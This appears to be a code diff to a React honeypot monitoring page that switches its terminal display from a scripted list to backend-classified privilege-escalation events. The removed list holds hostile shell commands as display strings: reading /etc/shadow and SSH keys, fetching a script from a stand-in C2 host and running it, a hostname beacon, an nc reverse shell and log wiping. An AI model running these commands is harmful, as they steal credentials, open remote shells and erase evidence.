@@ -1,19 +1,6 @@
 import { useEffect, useState, useRef } from 'react'
 import api, { core, ingest } from '../services/api'
 
-const FAKE_COMMANDS = [
-  'cat /etc/shadow',
-  'cat /etc/passwd',
-  'wget http://c2.example.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh',
-  'curl -s http://malicious.example.com/beacon?id=$(hostname)',
-  'nc -e /bin/bash 10.0.0.1 4444',
-  'ls -la /root/.ssh && cat /root/.ssh/id_rsa',
-  'chmod 777 /etc/passwd',
-  'sudo su -c "id && whoami"',
-  'find / -name "*.pem" -o -name "*.key" 2>/dev/null',
-  'rm -rf /var/log/* && history -c',
-]
-
 function StatCard({ icon, label, value, color = 'cyan', sub }) {
   const colors = {
     cyan:   'text-[#00F0FF] border-[#00F0FF]/20 bg-[#00F0FF]/5',
@@ -71,17 +58,19 @@ export default function HoneypotPage({ liveEvents = [] }) {
   useEffect(() => {
     fetchState()
     const t = setInterval(fetchState, 4000)
-    // Load real attack rows from dataset
-    api.get(core('/api/dataset/rows'))
-      .then(r => {
-        const attacks = (r.data.rows || []).filter(row => Number(row.attack_detected||0) === 1 || Number(row.privilege_escalation||0) === 1)
-        setDatasetAttacks(attacks)
-      })
-      .catch(() => {})
-    // Pre-populate terminal from the raw log corpus — the dataset rows carry no
-    // log text, so they cannot fill the terminal.
+    // Load the raw log corpus, then run it through the real per-line
+    // privilege-escalation analysis (ingestion service) to get genuine
+    // actors/raw lines/types — NOT backend/data/intrusion_data.csv's numeric
+    // rows, which have no actor/raw_log/privilege_escalation fields at all
+    // (that mismatch was silently rendering "unknown" for every row here).
     api.get(core('/api/dataset/logs'))
-      .then(r => setTermLines((r.data.lines || []).slice(0, 10)))
+      .then(r => {
+        const lines = r.data.lines || []
+        setTermLines(lines.slice(0, 10))
+        if (lines.length === 0) return
+        return api.post(ingest('/analyze/priv-esc'), { log_lines: lines })
+          .then(res => setDatasetAttacks(res.data.attack_events || []))
+      })
       .catch(() => {})
     return () => clearInterval(t)
   }, [])
@@ -110,29 +99,15 @@ export default function HoneypotPage({ liveEvents = [] }) {
 
     try {
       // Simulate via backend which delegates to ingestion
-      const r = await api.post(core('/api/simulate'), { count: 3 })
-      const results = r.data
-
-      // Push real attack rows to ingest
-      const attacksToSend = datasetAttacks.slice(0, 3)
-      for (const row of attacksToSend) {
-        try {
-          await api.post(ingest('/ingest'), {
-            ip: row.src_ip || '10.0.1.55',
-            device: row.name || 'Privilege Escalation',
-            request_count: Math.max(
-              Number(row.failed_logins||0) * 5 + Number(row.login_attempts||0) * 2 + Number(row.privilege_escalation||0) * 12,
-              50
-            ),
-          })
-        } catch {}
-      }
+      await api.post(core('/api/simulate'), { count: 3 })
 
       setTimeout(async () => {
         await fetchState()
-        // Show real attack log lines in terminal
-        const lines = datasetAttacks.map(r => r.raw_log).filter(Boolean).slice(0, 8)
-        setTermLines(lines.length > 0 ? lines : FAKE_COMMANDS.slice(0, 6))
+        // Show real attack log lines already loaded from analyze/priv-esc —
+        // no scripted fallback. If there are none, the terminal just stays
+        // empty (existing empty-state message below covers that case).
+        const lines = datasetAttacks.map(r => r.raw).filter(Boolean).slice(0, 8)
+        if (lines.length > 0) setTermLines(lines)
         setSimLog(p => [...p, 'Done. Check honeypot entries below.'])
         setSimulating(false)
       }, 3200)
@@ -368,11 +343,13 @@ export default function HoneypotPage({ liveEvents = [] }) {
           </div>
           <div className="space-y-2 max-h-64 overflow-y-auto pr-1">
             {datasetAttacks.map((row, i) => {
-              const isShell = row.raw_log?.includes('COMMAND=/bin/bash') || row.raw_log?.includes('COMMAND=/bin/sh')
-              const isSession = row.raw_log?.toLowerCase().includes('session opened for user root')
-              const isFailed = row.raw_log?.toLowerCase().includes('incorrect password')
-              const type = isShell ? 'ROOT_SHELL_SPAWN' : isSession ? 'ROOT_SESSION_OPENED' : isFailed ? 'FAILED_SUDO' : 'PRIV_ESC'
-              const color = isShell ? '#FF003C' : isSession ? '#FF6B00' : '#FFEA00'
+              // type comes from the backend's own classification
+              // (analyze_privilege_escalation) — not re-guessed here, so the
+              // label can never disagree with how it was actually detected.
+              const color = row.type === 'ROOT_SHELL_SPAWN' ? '#FF003C'
+                : row.type === 'ROOT_SESSION_OPENED' ? '#FF6B00'
+                : row.type === 'FAILED_SUDO_ATTEMPT' ? '#FFEA00'
+                : '#FFEA00'
               return (
                 <div key={i} className="rounded-lg border px-3 py-2 mono-text text-xs"
                   style={{ borderColor: color+'30', backgroundColor: color+'08' }}>
@@ -380,12 +357,12 @@ export default function HoneypotPage({ liveEvents = [] }) {
                     <div className="flex items-center gap-2">
                       <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
                       <span className="font-bold text-[9px] px-1.5 py-0.5 rounded border"
-                        style={{ color, borderColor: color+'44', backgroundColor: color+'10' }}>{type}</span>
-                      <span className="font-bold" style={{ color }}>{row.actor || 'unknown'}</span>
+                        style={{ color, borderColor: color+'44', backgroundColor: color+'10' }}>{row.type}</span>
+                      <span className="font-bold" style={{ color }}>{row.actor}</span>
                     </div>
-                    <span className="text-[#94A3B8] text-[10px]">{row.log_timestamp}</span>
+                    <span className="text-[#94A3B8] text-[10px]">{row.timestamp}</span>
                   </div>
-                  <code className="text-[9px] text-[#94A3B8] break-all leading-relaxed">{row.raw_log}</code>
+                  <code className="text-[9px] text-[#94A3B8] break-all leading-relaxed">{row.raw}</code>
                 </div>
               )
             })}
